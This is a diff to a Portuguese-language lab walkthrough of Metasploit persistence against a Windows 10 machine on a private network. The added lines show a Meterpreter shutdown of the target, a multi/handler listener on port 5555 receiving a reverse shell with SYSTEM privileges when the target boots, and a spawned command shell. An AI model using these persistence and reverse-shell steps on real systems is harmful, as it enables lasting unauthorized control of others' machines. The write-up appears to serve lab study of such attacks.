@@ -122,12 +122,13 @@ Active sessions
   3         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN10-  192.168.1.10:5555 -> 192.168.
                                      22H2                          1.41:49797 (192.168.1.41)
 ```
-Executando um reboot da máquina alvo:
+Executando um shutdown da máquina alvo:
 ```
-meterpreter > reboot
-Rebooting...
-meterpreter > [*] 192.168.1.41 - Meterpreter session 2 closed.  Reason: Died
-[*] 192.168.1.41 - Meterpreter session 3 closed.  Reason: Died
+meterpreter > shutdown
+Shutting down...
+meterpreter > [*] 192.168.1.41 - Meterpreter session 4 closed.  Reason: Died
+[*] 192.168.1.41 - Meterpreter session 14 closed.  Reason: Died
+[*] 192.168.1.41 - Meterpreter session 27 closed.  Reason: Died
 ```
 ```
 msf exploit(windows/local/persistence_service) > show sessions
@@ -139,9 +140,38 @@ No active sessions.
 ```
 Nenhuma sessão ativa, uma vez que a máquina desligou...
 
-Contudo, com a execução do listenner, quando a máquina alvo se reiniciar, teremos acesso com privilégio SYSTEM.
+Com a execução de um listenner, quando a máquina alvo reiniciar, teremos acesso com privilégio SYSTEM. Tem que usar a mesma porta do exploit de persistência, nesse caso 5555.
 ```
 msf exploit(multi/handler) > run
 [*] Started reverse TCP handler on 192.168.1.10:5555 
+[*] Sending stage (177734 bytes) to 192.168.1.41
+[*] Meterpreter session 1 opened (192.168.1.10:5555 -> 192.168.1.41:49672) at 2025-09-05 01:05:57 -0300
 
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
 
+meterpreter > shell
+Process 1032 created.
+Channel 2 created.
+Microsoft Windows [Version 10.0.19045.2965]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>exit
+exit
+
+meterpreter > background
+[*] Backgrounding session 1...
+```
+A sessão é criada com o boot da máquina alvo:
+```
+msf exploit(multi/handler) > show sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ WIN10-  192.168.1.10:5555 -> 192.168.
+                                     22H2                          1.41:49671 (192.168.1.41)
+```
+Ataque bem sucedido. Não é necessário mais fazer o exploitations e escalar privilégios, basta escutar a rede.
